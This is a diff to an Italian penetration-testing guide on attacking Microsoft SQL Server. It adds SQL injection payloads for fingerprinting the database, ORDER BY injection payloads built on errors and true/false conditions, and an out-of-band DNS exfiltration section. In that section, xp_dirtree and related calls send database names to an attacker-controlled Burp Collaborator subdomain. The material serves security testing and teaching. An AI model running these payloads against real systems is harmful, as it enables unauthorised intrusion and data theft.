@@ -14,7 +14,8 @@ tags:
   - mssql
 ---
 
-Da una porta 1433 aperta o da una SQL Injection su MSSQL (Microsoft SQL Server) puoi arrivare a enumerazione completa, hash capture con **xp\_dirtree**, RCE tramite** xp\_cmdshell **e movimento laterale in Active Directory. Questa guida ti porta dall'inizio alla fine, coprendo entrambi i percorsi.
+Da una porta 1433 aperta o da una SQL Injection su MSSQL (Microsoft SQL Server) puoi arrivare a enumerazione completa, hash capture con `xp_dirtree`, RCE tramite `xp_cmdshell` e movimento laterale in Active Directory. Questa guida ti porta dall'inizio alla fine, coprendo entrambi i percorsi.
+
 **Cosa imparerai:**
 
 * Come capire se un server espone MSSQL sulla porta 1433
@@ -245,16 +246,45 @@ Se la sorgente è una web app che usa MSSQL come backend, prima conferma il DBMS
 | Ritardo 5+ secondi con `WAITFOR DELAY`   | Time-based blind confermata                  |
 | Nessuna differenza                       | WAF attivo o parametro non iniettabile       |
 
-### Conferma che è MSSQL e non un altro DBMS
+### Fingerprinting progressivo — capire quale DB è
+
+Prima di usare payload MSSQL-specifici, identifica il DBMS. Il metodo più affidabile via web è il **time-based**: ogni DB ha la sua funzione di delay.
 
 ```sql
-' AND @@VERSION LIKE '%Microsoft SQL Server%'-- -
-' AND BINARY_CHECKSUM(1)=BINARY_CHECKSUM(1)-- -
-' AND @@CONNECTIONS>0-- -
-' AND 1=CONVERT(int,@@VERSION)-- -   → errore con versione nel testo
+-- MSSQL → WAITFOR DELAY (esclusivo, non esiste su nessun altro DBMS)
+'; WAITFOR DELAY '0:0:5';-- -
+
+-- MySQL/MariaDB → SLEEP
+' AND SLEEP(5)-- -
+
+-- PostgreSQL → pg_sleep
+' AND pg_sleep(5)>0-- -
+
+-- Oracle → DBMS_PIPE
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -
 ```
 
-Se qualcuno ritorna TRUE o un errore con "Microsoft SQL Server" → sei su MSSQL.
+Se con `WAITFOR DELAY` il server risponde dopo 5 secondi → **sei su MSSQL**, stop.
+
+Se gli errori sono visibili, anche il testo dell'errore fingerprinta il DB:
+
+| Errore                                 | DBMS       |
+| -------------------------------------- | ---------- |
+| `Incorrect syntax near`                | MSSQL      |
+| `You have an error in your SQL syntax` | MySQL      |
+| `unterminated quoted string`           | PostgreSQL |
+| `ORA-00933`                            | Oracle     |
+
+### Conferma MSSQL con payload specifici
+
+Una volta sospettato MSSQL, conferma con funzioni che esistono solo su SQL Server:
+
+```sql
+' AND @@CONNECTIONS>0-- -                  → solo MSSQL
+' AND BINARY_CHECKSUM(1)=BINARY_CHECKSUM(1)-- -   → solo MSSQL
+' AND 1=CONVERT(int,@@VERSION)-- -         → errore con versione MSSQL nel testo
+' AND @@VERSION LIKE '%Microsoft SQL Server%'-- -  → TRUE solo su MSSQL
+```
 
 ***
 
@@ -404,7 +434,22 @@ Per **parametro numerico** (nessun apice):
 '%2527 UNION SELECT 1,2,3-- -
 ```
 
-### Step 4 — Tecniche avanzate WAF bypass
+### Step 4 — ORDER BY injection
+
+Quando il punto iniettabile è nel clausola `ORDER BY`, UNION non funziona. Usa error-based:
+
+```sql
+-- Errore con il valore nel testo
+ORDER BY 1,CONVERT(int,@@VERSION)-- -
+ORDER BY (SELECT 1 WHERE 1=CONVERT(int,@@VERSION))-- -
+ORDER BY (SELECT TOP 1 name FROM master..sysdatabases)-- -
+
+-- Boolean via ORDER BY (cambia ordine risultati)
+ORDER BY (SELECT CASE WHEN (1=1) THEN name ELSE id END FROM users)-- -
+ORDER BY (SELECT CASE WHEN IS_SRVROLEMEMBER('sysadmin')=1 THEN 1 ELSE 2 END)-- -
+```
+
+### Step 5 — Tecniche avanzate WAF bypass
 
 **HTTP Parameter Pollution (HPP)**
 Se l'app ha due parametri che finiscono nella stessa query, puoi spezzare il payload tra i due — il WAF ispeziona ogni parametro singolarmente e non vede il payload completo:
@@ -768,6 +813,25 @@ SELECT * FROM OPENROWSET(BULK N'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS 
 EXECUTE master.sys.xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion','ProductName';
 EXECUTE master.sys.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Services\MSSQLSERVER','ObjectName';
 ```
+
+***
+
+## 12b. DNS Exfiltration Out-of-Band {#12b}
+
+Quando non puoi usare Responder (firewall outbound sulla 445) ma hai accesso a Burp Collaborator o un tuo DNS server:
+
+```sql
+-- xp_dirtree verso Burp Collaborator (nessuna porta SMB necessaria, usa DNS)
+'; EXEC master..xp_dirtree '\\tuosubdominio.burpcollaborator.net\share';-- -
+
+-- fn_xe_file_target_read_file (richiede VIEW SERVER STATE)
+'; IF EXISTS(SELECT * FROM fn_xe_file_target_read_file('C:\*.xel','\\'+(SELECT TOP 1 name FROM master..sysdatabases)+'.tuosubdominio.burpcollaborator.net\1.xem',null,null)) SELECT 1;-- -
+
+-- Esfiltra dati via DNS (nome DB nel subdomain)
+'; DECLARE @q NVARCHAR(256); SELECT @q=DB_NAME(); DECLARE @cmd NVARCHAR(4000); SET @cmd='\\'+@q+'.tuosubdominio.burpcollaborator.net\path'; EXEC master.dbo.xp_dirtree @cmd;-- -
+```
+
+Il subdomain che arriva al tuo DNS contiene il dato — in questo caso il nome del DB. Funziona anche quando la porta 445 è bloccata in uscita.
 
 ***
 
